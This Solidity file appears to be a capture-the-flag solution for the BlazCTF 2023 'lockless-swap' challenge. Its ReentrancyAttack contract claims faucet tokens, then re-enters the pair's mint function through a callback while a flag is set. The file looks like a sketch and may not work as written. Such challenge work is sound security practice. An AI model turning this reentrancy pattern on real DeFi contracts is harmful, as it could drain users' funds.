// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../lib/blazctf-2023/challenges/lockless-swap/challenge/project/src/Challenge.sol";
import "../../lib/blazctf-2023/challenges/lockless-swap/challenge/project/src/LocklessPancakePair.sol";

contract ReentrancyAttack {
    Challenge public challenge;
    PancakePair public pair;
    bool public inAttack;

    constructor(address _challengeAddress, address _pairAddress) {
        challenge = Challenge(_challengeAddress);
        pair = PancakePair(_pairAddress);
    }

    function startAttack() external {
        challenge.faucet();
        
        inAttack = true;

        pair.mint(address(this));
        inAttack = false;
    }

    function token0Callback() external {
        if (inAttack) {
            pair.mint(address(this));
        }
    }
}